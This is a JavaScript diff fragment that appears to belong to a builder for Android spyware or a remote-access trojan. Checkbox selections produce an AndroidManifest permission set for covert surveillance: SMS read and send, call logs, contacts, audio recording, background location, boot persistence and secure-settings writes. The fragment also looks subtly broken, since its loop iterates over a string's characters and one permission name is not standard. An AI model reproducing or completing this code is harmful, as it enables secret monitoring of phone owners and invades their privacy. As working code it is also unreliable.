+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+        for (var i = 0; i < permArray.length; i++) {
+            var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
+            permissionName = permissionName.substring(0, permissionName.indexOf('"'));
+            if (firstPart.indexOf(permissionName) == -1) {
+                firstPart = firstPart + "\n" + permArray[i];
+            }
+        }
+
+        return (firstPart + lastPart);
+
+    };
 
 
     // function to use onBoot method 
